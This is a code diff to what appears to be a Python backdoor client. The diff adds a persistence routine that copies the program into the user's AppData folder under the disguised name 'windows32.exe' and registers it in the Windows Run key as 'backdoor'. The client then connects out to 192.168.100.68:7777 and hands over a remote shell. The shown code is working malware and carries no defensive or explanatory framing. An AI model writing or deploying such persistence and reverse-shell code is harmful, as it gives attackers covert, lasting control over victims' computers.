@@ -7,6 +7,13 @@ import base64
 import requests
 import mss
 import os
+import shutil
+
+def create_persistence():
+    location = os.environ['appdata']+'\\windows32.exe'
+    if not os.path.exists(location):
+        shutil.copyfile(sys.executable,location)
+        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "'+location+'"',shell=True)
 
 def download_file_url(url):
     query = requests.get(url)
@@ -70,7 +77,7 @@ def shell():
                 client.send("1".encode())
             else:
                 client.send(result)
-
+create_persistence()
 client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 client.connect(('192.168.100.68',7777))
 shell()
